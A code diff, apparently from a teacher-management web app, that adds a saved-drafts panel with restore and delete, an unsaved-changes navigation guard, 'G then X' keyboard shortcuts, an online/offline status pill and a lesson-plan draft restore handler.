+    const rows = Array.from(this._drafts.entries())
+      .sort((a, b) => (b[1].savedAt || '').localeCompare(a[1].savedAt || ''));
+
+    const m = UI.modal({
+      title: 'Saved drafts',
+      size: 'modal-lg',
+      body: rows.length ? `
+        <p class="text-sm text-muted mb-12">
+          Drafts are stored on this device only. They are not uploaded anywhere.
+        </p>
+        <div class="unsaved-draft-list">
+          ${rows.map(([id, d]) => `
+            <div class="unsaved-draft-row" data-draft-id="${Utils.attr(id)}">
+              <div class="unsaved-draft-main">
+                <div class="unsaved-draft-label">${Utils.esc(d.label || id)}</div>
+                <div class="unsaved-draft-meta">Saved ${Utils.timeAgo(d.savedAt)}</div>
+              </div>
+              <div class="unsaved-draft-actions">
+                <button class="btn btn-sm btn-outline" data-draft-restore="${Utils.attr(id)}">
+                  ${icon('history')} Restore
+                </button>
+                <button class="btn btn-sm btn-ghost" data-draft-delete="${Utils.attr(id)}"
+                        style="color:var(--danger);">
+                  ${icon('trash')}
+                </button>
+              </div>
+            </div>`).join('')}
+        </div>` : `<p class="text-sm text-muted">No saved drafts.</p>`,
+      footer: `<button class="btn btn-primary" data-close>Close</button>`
+    });
+
+    m.overlay.querySelectorAll('[data-draft-restore]').forEach(btn => {
+      btn.onclick = async () => {
+        const id = btn.dataset.draftRestore;
+        const d = this._drafts.get(id);
+        if (!d) return;
+        m.close();
+        await this._restore(id, d.payload);
+      };
+    });
+
+    m.overlay.querySelectorAll('[data-draft-delete]').forEach(btn => {
+      btn.onclick = () => {
+        const id = btn.dataset.draftDelete;
+        this._drafts.delete(id);
+        this._persist();
+        this._reflectBadge();
+        m.close();
+        this.openDraftsPanel();
+      };
+    });
+  },
+
+  async _restore(moduleId, payload) {
+    const restorer = this._restorers.get(moduleId);
+    if (restorer) {
+      try {
+        await restorer(payload);
+        this._drafts.delete(moduleId);
+        this._persist();
+        this._reflectBadge();
+        UI.toast('Draft restored', 'success');
+        return;
+      } catch (e) {
+        console.error('[Unsaved] restore handler threw:', e);
+        UI.toast('Could not restore the draft.', 'error');
+        return;
+      }
+    }
+    try {
+      Utils.download(
+        `klazassist-draft-${moduleId}-${Utils.timestampForFilename()}.json`,
+        JSON.stringify(payload, null, 2),
+        'application/json'
+      );
+      UI.toast('Draft downloaded as JSON (no inline restore available for this module).', 'info', 5000);
+    } catch (e) {
+      UI.toast('Could not restore or download the draft.', 'error');
+    }
+  }
+};
+
+/* -------- Hook into App.navigate -------- */
+const _origNavigate = App.navigate.bind(App);
+App.navigate = async function (id) {
+  if (id === State.currentModule) return _origNavigate(id);
+  const verdict = await Unsaved.intercept(id);
+  if (verdict.action === 'cancel') return;
+  return _origNavigate(id);
+};
+
+/* -------- Warn before tab close -------- */
+window.addEventListener('beforeunload', (e) => {
+  if (Unsaved.isDirty()) {
+    e.preventDefault();
+    e.returnValue = '';
+  }
+});
+
+
+/* ============================================================================
+   KEYBOARD SHORTCUTS
+   ----------------------------------------------------------------------------
+   • "G then X" chord navigation — no modifier required.
+   • Cmd/Ctrl+K opens the existing global search.
+   • Shift+? opens a shortcuts cheat sheet.
+   • Never fires while a text field has focus.
+   ============================================================================ */
+const Shortcuts = {
+  _chordArmed: false,
+  _chordTimer: null,
+
+  BINDINGS: [
+    { chord: 'd', label: 'Go to Dashboard',        run: () => App.navigate('dashboard') },
+    { chord: 'a', label: 'Go to Attendance',       run: () => App.navigate('attendance') },
+    { chord: 'l', label: 'Go to Learners',         run: () => App.navigate('learners') },
+    { chord: 'g', label: 'Go to Gradebook',        run: () => App.navigate('gradebook') },
+    { chord: 's', label: 'Go to Schedule',         run: () => App.navigate('schedule') },
+    { chord: 'p', label: 'Go to Lesson Planner',   run: () => App.navigate('lesson-planner') },
+    { chord: 't', label: 'Go to Teaching Tools',   run: () => App.navigate('teaching-tools') },
+    { chord: 'f', label: 'Go to School Forms',     run: () => App.navigate('school-forms') },
+    { chord: 'n', label: 'Go to Notes',            run: () => App.navigate('notes') },
+    { chord: 'r', label: 'Go to Reports & Export', run: () => App.navigate('reports-and-export') }
+  ],
+
+  init() {
+    document.addEventListener('keydown', (e) => this._onKey(e));
+  },
+
+  _inTextInput(el) {
+    if (!el) return false;
+    const tag = (el.tagName || '').toLowerCase();
+    if (tag === 'input' || tag === 'textarea' || tag === 'select') return true;
+    if (el.isContentEditable) return true;
+    return false;
+  },
+
+  _onKey(e) {
+    const focused = document.activeElement;
+    const typing = this._inTextInput(focused);
+
+    if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k') {
+      e.preventDefault();
+      if (Session.state.authenticated && !Session.state.locked) App.openGlobalSearch();
+      return;
+    }
+
+    if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 's') {
+      e.preventDefault();
+      document.dispatchEvent(new CustomEvent('klaz:save-shortcut'));
+      return;
+    }
+
+    if (!typing && e.key === '?') {
+      e.preventDefault();
+      this.showCheatsheet();
+      return;
+    }
+
+    if (typing) return;
+    if (e.ctrlKey || e.metaKey || e.altKey) return;
+    if (!Session.state.authenticated || Session.state.locked) return;
+
+    if (e.key.toLowerCase() === 'g') {
+      this._chordArmed = true;
+      if (this._chordTimer) clearTimeout(this._chordTimer);
+      this._chordTimer = setTimeout(() => { this._chordArmed = false; }, 1400);
+      return;
+    }
+
+    if (this._chordArmed) {
+      const key = e.key.toLowerCase();
+      const match = this.BINDINGS.find(b => b.chord === key);
+      this._chordArmed = false;
+      if (this._chordTimer) { clearTimeout(this._chordTimer); this._chordTimer = null; }
+      if (match) {
+        e.preventDefault();
+        match.run();
+      }
+    }
+  },
+
+  showCheatsheet() {
+    const modKey = navigator.platform && /Mac/i.test(navigator.platform) ? '⌘' : 'Ctrl';
+    UI.modal({
+      title: 'Keyboard shortcuts',
+      size: 'modal-lg',
+      body: `
+        <p class="text-sm text-muted mb-16">
+          Press <kbd>G</kbd> then a second key to jump anywhere. Shortcuts
+          are disabled while you're typing in a text field.
+        </p>
+
+        <div class="shortcut-section">Navigation — <kbd>G</kbd> then…</div>
+        <div class="shortcut-grid">
+          ${this.BINDINGS.map(b => `
+            <div class="shortcut-row">
+              <span class="shortcut-keys">
+                <kbd>G</kbd> <span class="shortcut-plus">then</span> <kbd>${b.chord.toUpperCase()}</kbd>
+              </span>
+              <span class="shortcut-label">${Utils.esc(b.label.replace('Go to ', ''))}</span>
+            </div>`).join('')}
+        </div>
+
+        <div class="shortcut-section">Anywhere</div>
+        <div class="shortcut-grid">
+          <div class="shortcut-row">
+            <span class="shortcut-keys"><kbd>${modKey}</kbd> <kbd>K</kbd></span>
+            <span class="shortcut-label">Global search</span>
+          </div>
+          <div class="shortcut-row">
+            <span class="shortcut-keys"><kbd>${modKey}</kbd> <kbd>S</kbd></span>
+            <span class="shortcut-label">Save current form</span>
+          </div>
+          <div class="shortcut-row">
+            <span class="shortcut-keys"><kbd>Shift</kbd> <kbd>?</kbd></span>
+            <span class="shortcut-label">Show this cheatsheet</span>
+          </div>
+          <div class="shortcut-row">
+            <span class="shortcut-keys"><kbd>Esc</kbd></span>
+            <span class="shortcut-label">Close the top dialog</span>
+          </div>
+        </div>`,
+      footer: `<button class="btn btn-primary" data-close>Close</button>`
+    });
+  }
+};
+Shortcuts.init(); 
+
+
+/* ============================================================================
+   NETWORK STATUS INDICATOR
+   ----------------------------------------------------------------------------
+   A tiny pill in the topbar that reflects online / offline / syncing state.
+   Offline is a first-class state in an offline-first app, so the pill turns
+   blue instead of red — this is expected behaviour, not an error.
+   ============================================================================ */
+const NetStatus = {
+  init() {
+    if (!document.getElementById('net-pill-style')) {
+      const s = document.createElement('style');
+      s.id = 'net-pill-style';
+      s.textContent = `
+        .net-pill {
+          display: inline-flex; align-items: center; gap: 6px;
+          padding: 5px 10px; border-radius: 20px;
+          font-size: 11px; font-weight: 700;
+          background: rgba(25,135,84,0.10);
+          color: var(--success);
+          border: 1px solid rgba(25,135,84,0.22);
+          transition: all 0.25s ease;
+          white-space: nowrap;
+        }
+        .net-pill.offline {
+          background: var(--light-blue);
+          color: var(--deped-blue);
+          border-color: rgba(0,56,168,0.22);
+        }
+        .net-pill.syncing {
+          background: rgba(247,201,72,0.16);
+          color: #8a6d0e;
+          border-color: rgba(247,201,72,0.35);
+        }
+        .net-pill .net-dot {
+          width: 7px; height: 7px; border-radius: 50%;
+          background: currentColor;
+        }
+        .net-pill.syncing .net-dot { animation: netPulse 1.2s ease-in-out infinite; }
+        @keyframes netPulse { 0%,100% { opacity: 1; } 50% { opacity: 0.35; } }
+        @media (max-width: 640px) {
+          .net-pill span.label { display: none; }
+          .net-pill { padding: 5px 8px; }
+        }
+      `;
+      document.head.appendChild(s);
+    }
+
+    const themeToggle = document.getElementById('theme-toggle');
+    if (themeToggle && themeToggle.parentElement) {
+      const pill = document.createElement('div');
+      pill.id = 'net-pill';
+      pill.className = 'net-pill';
+      pill.innerHTML = `<span class="net-dot"></span><span class="label">Online</span>`;
+      themeToggle.parentElement.insertBefore(pill, themeToggle);
+    }
+
+    const update = () => {
+      const pill = document.getElementById('net-pill');
+      if (!pill) return;
+      const label = pill.querySelector('.label');
+      pill.classList.remove('offline', 'syncing');
+      if (!navigator.onLine) {
+        pill.classList.add('offline');
+        if (label) label.textContent = 'Offline';
+        pill.title = 'Offline — all features still work. Sync and AI need internet.';
+      } else {
+        if (label) label.textContent = 'Online';
+        pill.title = 'Connected. Sync and AI features are available.';
+      }
+    };
+
+    window.addEventListener('online',  () => { update(); UI.toast('Back online', 'success', 2000); });
+    window.addEventListener('offline', () => { update(); UI.toast('Offline — your work is still saved locally', 'info', 3500); });
+    update();
+    this._update = update;
+  },
+
+  setSyncing(on) {
+    const pill = document.getElementById('net-pill');
+    if (!pill) return;
+    if (on) {
+      pill.classList.remove('offline');
+      pill.classList.add('syncing');
+      const label = pill.querySelector('.label');
+      if (label) label.textContent = 'Syncing…';
+    } else {
+      this._update && this._update();
+    }
+  }
+};
 window.SyncManager = SyncManager;
 
 /* ============================================================================
@@ -60062,6 +60746,19 @@ document.addEventListener('DOMContentLoaded', () => {
   window.addEventListener('error', (e) => { console.error('Uncaught error:', e.error || e.message); });
   window.addEventListener('unhandledrejection', (e) => { console.error('Unhandled promise rejection:', e.reason); });
 
+/* ============================================================================
+   DRAFT RESTORERS
+   ----------------------------------------------------------------------------
+   Each entry teaches `Unsaved` how to rehydrate a saved draft back into its
+   source form. Without a restorer, `Unsaved._restore` falls back to
+   downloading the raw payload as JSON.
+
+   Placement note: these calls reference `Unsaved` (declared above with
+   `const`) and `Pages` (declared much earlier). Both must exist by the
+   time this module-scope code runs, which is why it sits at the very
+   bottom of `main.ts`.
+   ============================================================================ */
+
   /* ============================================================================
      VERSION LABEL SYNC
      ============================================================================ */
@@ -60259,5 +60956,53 @@ document.addEventListener('DOMContentLoaded', () => {
     const btn = document.getElementById('install-btn');
     if (btn) btn.classList.add('hidden');
   };
+  /* ============================================================================
+     Restore handler for saved Lesson Plan drafts
+     ----------------------------------------------------------------------------
+     Registered inside DOMContentLoaded so both `Unsaved` and `Pages` are fully
+     initialized. At module scope, `Unsaved` is declared later in the file than
+     `Pages`, so referencing it there would throw a temporal-dead-zone error.
+     ============================================================================ */
+  Unsaved.registerRestorer('lesson-planner', async (payload) => {
+    document.querySelectorAll('.modal-overlay').forEach(x => x.remove());
+    await Pages.openLessonModal(payload.existingId);
+    await new Promise(r => setTimeout(r, 150));
+
+    const root = document.querySelector('.modal-overlay');
+    if (!root) throw new Error('Lesson Plan modal did not open.');
+
+    const set = (id, v) => {
+      const el = root.querySelector('#' + id);
+      if (el) el.value = v || '';
+    };
+    set('lp-date',       payload.fields.date);
+    const savedTerm = String(payload.fields.term || payload.fields.quarter || '').trim();
+    const savedTermMatch = savedTerm.match(/(?:term|quarter)\s*([1-3])/i);
+    set('lp-quarter', savedTermMatch ? 'Term ' + savedTermMatch[1] : '');
+    set('lp-area',       payload.fields.learningArea);
+    set('lp-topic',      payload.fields.topic);
+    set('lp-comp',       payload.fields.competency);
+    set('lp-objectives', payload.fields.objectives);
+    set('lp-content',    payload.fields.content);
+    set('lp-resources',  payload.fields.resources);
+    set('lp-assessment', payload.fields.assessment);
+    set('lp-assignment', payload.fields.assignment);
+    set('lp-remarks',    payload.fields.remarks);
+
+    const gradeSel = root.querySelector('#lp-grade');
+    if (gradeSel && payload.fields.gradeLevel) {
+      const known = Array.from(gradeSel.options).some(o => o.value === payload.fields.gradeLevel);
+      if (known) gradeSel.value = payload.fields.gradeLevel;
+    }
+
+    root.querySelectorAll('textarea[data-proc]').forEach(t => {
+      if (payload.procedures && t.dataset.proc in payload.procedures) {
+        t.value = payload.procedures[t.dataset.proc];
+      }
+    });
+
+    Unsaved.mark('lesson-planner');
+  });
+
   App.bootstrap();
 });
